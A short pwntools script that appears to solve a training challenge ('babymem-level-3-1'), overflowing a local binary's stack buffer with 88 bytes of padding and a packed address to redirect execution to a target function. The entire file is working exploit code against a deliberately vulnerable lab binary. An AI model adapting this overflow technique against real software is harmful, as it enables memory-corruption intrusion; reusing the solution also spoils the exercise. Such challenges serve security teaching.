import pwn

p = pwn.process("/challenge/babymem-level-3-1")

p.readuntil(b"size: ")
p.writeline("96")

p.readuntil(b"bytes)!")
val = pwn.p64(0x000000000040212e)
p.write(b"A"*88+val)

print(p.readall().decode("utf-8"))
